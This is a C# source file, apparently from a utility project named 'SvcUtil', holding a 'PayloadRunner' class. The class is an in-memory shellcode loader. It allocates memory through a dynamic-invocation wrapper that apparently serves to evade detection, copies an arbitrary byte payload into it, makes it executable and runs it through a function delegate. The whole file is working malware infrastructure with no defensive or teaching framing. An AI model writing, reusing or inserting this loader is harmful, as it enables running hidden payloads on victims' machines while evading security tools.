using System;
using System.Runtime.InteropServices;

namespace SvcUtil
{
    internal static class PayloadRunner
    {
        // Constants
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint MEM_RELEASE = 0x8000;
        private const uint PAGE_READWRITE = 0x04;
        private const uint PAGE_EXECUTE_READ = 0x20;

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate void EntryPoint();

        public static bool Execute(byte[] data)
        {
            if (data == null || data.Length == 0)
                return false;

            UIntPtr size = (UIntPtr)data.Length;
            IntPtr baseAddr = IntPtr.Zero;

            try
            {
                // Step 1: Allocate RW memory
                baseAddr = DynInvoke.VirtualAlloc(
                    IntPtr.Zero, size,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE);

                if (baseAddr == IntPtr.Zero)
                    return false;

                // Step 2: Copy payload into allocated region
                Marshal.Copy(data, 0, baseAddr, data.Length);

                // Step 3: Change protection to RX
                uint oldProtect;
                if (!DynInvoke.VirtualProtect(
                        baseAddr, (UIntPtr)data.Length,
                        PAGE_EXECUTE_READ, out oldProtect))
                {
                    DynInvoke.VirtualFree(baseAddr, UIntPtr.Zero, MEM_RELEASE);
                    return false;
                }

                // Step 4: Execute via delegate invocation
                var entry = (EntryPoint)Marshal.GetDelegateForFunctionPointer(
                    baseAddr, typeof(EntryPoint));

                entry();

                return true;
            }
            catch
            {
                return false;
            }
            finally
            {
                // Clean up
                if (baseAddr != IntPtr.Zero)
                    DynInvoke.VirtualFree(baseAddr, UIntPtr.Zero, MEM_RELEASE);
            }
        }
    }
}
